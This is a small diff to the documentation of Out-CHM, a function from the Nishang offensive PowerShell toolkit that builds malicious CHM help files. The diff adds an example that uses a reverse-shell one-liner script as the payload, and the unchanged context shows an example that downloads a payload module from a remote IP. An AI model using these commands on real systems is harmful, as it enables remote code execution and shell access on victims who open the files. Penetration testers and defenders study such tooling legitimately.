@@ -1,4 +1,4 @@
-﻿
+
 function Out-CHM
 {
 
@@ -59,6 +59,12 @@ Use Invoke-Encode from Nishang to encode the command or script.
 PS > Out-CHM -PayloadURL http://192.168.254.1/powerpreter.psm1 -Arguments Check-VM -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
 
 Use above command to pass an argument to the PowerShell script/module.
+
+.EXAMPLE
+PS > Out-CHM -PayloadScript C:\nishang\Shells\Invoke-PowerShellTcpOneLine.ps1
+
+Use above when you want to use a PowerShell script as the payload. Note that if the script expects any parameter passed to it, 
+you must pass the parameters in the script itself.
 
 .LINK
 http://www.labofapenetrationtester.com/2014/11/powershell-for-client-side-attacks.html
@@ -316,3 +322,4 @@ Multiple logical IP networks are in use and this computer needs a different IP a
     Remove-Item "$OutputPath\doc.hhp"
     
 }
+
